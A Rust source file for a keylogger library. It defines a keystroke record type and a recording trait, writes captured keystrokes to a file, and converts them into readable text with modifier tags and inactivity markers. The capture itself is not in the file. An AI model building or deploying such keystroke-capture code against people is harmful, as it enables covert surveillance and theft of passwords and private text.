use std::fs::OpenOptions;
use std::io::{BufWriter, Write};

#[derive(Debug,Clone)]
pub struct KeyRecord {
    pub key_code: u8,
    pub time: u32,  // unix time
    pub key_name: String,
    pub press: bool,  // release event if false
    pub modifiers: String
}

pub trait Keylogger {
    // records keystrokes in a different thread
    fn record_keystrokes(&mut self) -> Result<(), &'static str>;

    // Stop recording keystrokes and return result
    fn stop(&mut self) -> Result<Vec<KeyRecord>, &'static str>;
}



pub fn write_keylog_to_file(filename: &str,
                        keylog: &Vec<KeyRecord>
    ) -> Result<(), &'static str> {
    let file = match OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(filename) {
        Ok(f) => f,
        Err(_) => {
            return Err("Cannot create or open file");
        }
    };

    let mut writer = BufWriter::new(file);
    match write!(writer, "{}", _keylog_to_string(keylog)) {
        Ok(_) => Ok(()),
        Err(_) => Err("Cannot write to file")
    }
}

fn _keylog_to_string(keylog: &Vec<KeyRecord>) -> String {
    let mut current_modifiers = "0".to_string();
    let mut current_time = keylog[0].time;
    let mut keylog_string = "".to_string();

    for key in keylog.iter() {
        if !key.press {
            continue;
        }

        let time_diff = key.time - current_time;
        current_time = key.time;

        // if nothing has been printed in over 10 seconds, add new line
        if time_diff > 10000 {
            keylog_string.push_str(&format!("\n<Inactive for {} seconds>\n", time_diff/1000))
        }

        if current_modifiers != key.modifiers {
            if current_modifiers != "0" {
                keylog_string.push_str(&format!("</{}>", current_modifiers));
            }

            current_modifiers = key.modifiers.clone();

            if key.modifiers != "0" {
                keylog_string.push_str(&format!("<{}>", key.modifiers));
            }
        }

        if key.key_name.chars().count() > 1 {
            match key.key_name.as_str() {
                // Convert to char
                k if k == "Return" => keylog_string.push('\n'),
                k if k == "space" => keylog_string.push(' '),
                k if k == "slash" => keylog_string.push('/'),
                k if k == "equal" => keylog_string.push('='),
                k if k == "period" => keylog_string.push('.'),
                k if k == "comma" => keylog_string.push(','),
                k if k == "semicolon" => keylog_string.push(';'),
                k if k == "apostrophe" => keylog_string.push('\''),
                // Handled by modifier, no need to repeat them
                k if k == "Alt_L" => (),
                k if k == "Control_L" => (),
                k if k == "Shift_L" => (),
                _ => keylog_string.push_str(&format!("[{}]", key.key_name))
            };

            //keylog_string.push_str(&format!("[{}]", key.key_name));
            //if key.key_name == "Return" {
            //    keylog_string.push('\n');
            //}
        } else {
            keylog_string.push_str(&key.key_name);
        }
    }

    keylog_string
}

